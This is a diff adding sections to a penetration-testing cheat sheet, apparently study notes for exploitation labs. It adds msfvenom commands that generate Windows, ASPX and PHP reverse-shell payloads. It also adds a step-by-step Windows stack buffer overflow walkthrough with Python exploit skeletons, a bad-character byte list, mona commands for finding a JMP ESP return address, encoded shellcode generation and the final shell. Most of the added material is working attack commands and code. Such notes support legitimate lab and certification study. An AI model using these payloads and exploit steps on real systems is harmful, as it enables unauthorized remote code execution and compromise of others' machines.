@@ -461,8 +461,20 @@ busybox httpd -f -p 9090
 
 ### MSFvenom / Metasploit payloads
 ```bash
+# Windowssystem, reverse tcp ==> use for Buffer Overflows
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f c
+# same as above but without bad characters and encoding
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f c -e x86/shikata_ga_nai -b "<BADCHARS>"
+# example for BADCHARS: "\x00\x0a\x25\x26\x2b\x3d"
+
+# Don't break the application you exploit:
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<IP> EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "<BADCHARS>"
+
 # Windowssystem, e.g. with IIS
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
+
+# e.g. Apache Webserver with PHP (don't forget to remove comment at the beginning)
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
 ### Metasploit local exploit suggester
@@ -590,12 +602,192 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port
 Don't forget to remove the starting chars of the generated file.
 
 ## Buffer Overflows
+### Registers
+|Short|Register description|
+|--|--|
+|EAX|Arithmetical and Logical Instructions|
+|EBX|Base Pointer for Memory Addresses|
+|ECX|Loop, Shift, Rotation Counter|
+|EDX|I/O Port Addressing, Multiplication, Division|
+|ESI|Pointer of data and source in string copy operations|
+|EDI|Pointer of data and destination in string copy operations|
+
+|![registers.png](images/registers.png)|
+|:--:|
+|Register in Detail|
+
+### Pointers
+|Pointer|Description|
+|--|--|
+|ESP|keeps track of rhe most recently referenced location on the stack (pointer to it)|
+|EBP|Pointer to top of the stack|
+|EIP|Points to next code instruction to be executed|
+
+### Immunity Debugger Shortcuts
+|Key|Action|
+|--|--|
+|F2|Set Breakpoint|
+|F7|Step into|
+|F8|Step Over|
+|F9|Run|
+
+### Buffer Overflow
+#### Replicating the Crash
+- generate a unique payload with pattern_create and send this as payload to vulnerable application. See: [here](#create-unique-pattern)
+- EIP will be overwritten by a unique string
+- Call pattern_offset with length of generated string and the pattern you find in the EIP to get the correct offset. See: [here](#find-unique-pattern-offset)
+
+#### Controlling EIP
+- verify the offset by creating a payload: 
+	```python
+	
+	filler = "A" * <DETECTED-OFFSET>
+	eip = "B" * 4
+	buffer = "C" * (<PAYLOAD LENGTH FROM PoC> - len(filler) - len(eip))
+	
+	inputBuffer = filler + eip + buffer
+	
+	```
+
+#### Locating Space for Shellcode
+- reverse shell needs about 350-400 Bytes of space
+- try to verify if there's enough space fo the reverse shell in stack
+
+	```python
+	
+	filler = "A" * <DETECTED-OFFSET>
+	eip = "B" * 4
+	offset = "C" * 4
+	buffer = "D" * (<INCREASED PAYLOAD LENGHT> - len(filler) - len(eip) - len(offset))
+	
+	inputBuffer = filler + eip + offset + buffer
+	
+	```
+
+#### Checking for bad characters
+- characters that break the program flow (e.g. 0x00 (ends strings in C), 0x0D (carriage return - ends fields in http), 0x0A (line feed - ends fields in http))
+- You can use the following string to determine badchars:
+```python
+badchars = ( 
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) 
+```
+
+Remember: x00 is left out from the chars!
+
+
+```python
+filler = "A" * <DETECTED-OFFSET>
+eip = "B" * 4
+offset = "C" * 4
+
+	
+inputBuffer = filler + eip + offset + badchars
+
+```
+
+- After sending the badchars, follow ESP in Dump to see if a character did something unexpected
+- remove the character that breaks something from the badchars and rerun the script
+- determine all bad characters: e.g. "0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D"
+
+#### Redirecting the execution flow / Finding a return address
+- First guess: overwrite ESP ==> does not work, because this address changes every time the application runs
+- Use "JMP ESP"-instruction
+	- find a static address for this instruction
+		- librarys with ASLR support are not possible because address needs to be static
+		- address must not include any of the bad characters
+		- Find Information about modules with mona in Immunity Debugger:
+	```python
+	!mona modules
+	```
+	-	Find e.g. a DLL with Rebase, SafeSEH, ASL NXCompat OS Dll deactivated
+	-	Also the DLL must not contain any of the bad characters in its address
+	-	now find a "JMP ESP" instruction in the DLL
+	-	First wee need the OPCode for the instruction:
+	```bash
+	msf-nasm_shell
+	nasm > jmp esp
+	00000000 FFE4		jmp esp
+	```
+	- search for the instruction in before detected DLL:
+
+	```python
+	!mona find -s "\xff\xe4" -m "<MODULENAME>"
+	```
+	- returns 1-n addresses (check if it/they contains bad characters)
+	- Take address and use it with "Go to address in Disassembler" to verify if there's a "JMP ESP" instruction
+	- Now use the address of the instruction to overwrite the EIP:
+
+```python
+filler = "A" * 780
+eip = "<ADDRESS IN REVERSE>"
+offset = "C" * 4
+buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+
+inputBuffer = filler + eip + offset + buffer
+```
+**The address in the script needs to be in reverse.**
+E.g. you get the following address in immunity debugger for the JMP ESP instruction: 0x10090C83
+This results in the following in your script: "\x83\x0c\x09\x10"
+
+- now set a breakpoint on the JMP ESP instruction and rerun exploit to verify that you reach the instruction
+- In the Debugger step into the JMP ESP instruction and you'll see the "D"s as new instructions
+
+#### generating a shellcode
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f c -e x86/shikata_ga_nai -b "<BADCHARS>"
+```
+
+#### get the shell
+Shikata Ga Nai needs some space for decoding the payload. This decoding may overwrite some of the payload, so there is need for some space for this operation (NOPs).
+
+```python
+shellcode = <OUTPUT FROM MSFVENOM>
+filler = "A" * 780
+eip = "\x83\x0c\x09\x10"
+offset = "C" * 4
+nops = "\x90" * 10
+
+inputBuffer = filler + eip + offset + nops + shellcode
+```
+
+Now open your nc listener.
+==> Congrats you got a shell!
+If you break the application on ending your shell: use EXITFUNC=thread on payload generation with msfvenom
+
 
 ### Create unique pattern
 Create a unique pattern to identify correct position for buffer overflow
 ```bash
-/usr/share/metasploit-framework/tools/pattern_create.rb <# bytes>
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
+
+#Alternatively:
+msf-pattern_create -l <LENGTH>
 ```
+
+### Find unique pattern offset
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <LENGTH> -q <PATTERN>
+
+#Alternatively:
+msf-pattern_offset -l <LENGTH> -q <PATTERN>
+```
+
+
 
 # Local Enumeration
 
@@ -612,6 +804,9 @@ Show information about kernel and linux system
 ```bash
 uname -a
 ```
+
+- check for Kernel Exploits for the Kernel
+
 
 Show linux version
 ```bash
@@ -1003,10 +1198,15 @@ python3 RsaCtfTool.py --publickey <PUBLIC KEY> --uncipherfile <CIPHERED FILE>
 - Docker Escapte Tool [https://github.com/PercussiveElbow/docker-escape-tool](https://github.com/PercussiveElbow/docker-escape-tool)
 - evil-winrm
 - fuff - fuzz faster u fool [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)4
-- LinEnum
+- Immunity-Debugger (Windows)
+	- mona
+- LinEnum [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
 - LinPEAS
 - masscan
 - Metasploit
+	- msf-pattern_create
+	- msf-pattern_offset
+	- msf-nasm_shell
 - nbtscan
 - nc / Netcat
 - nikto
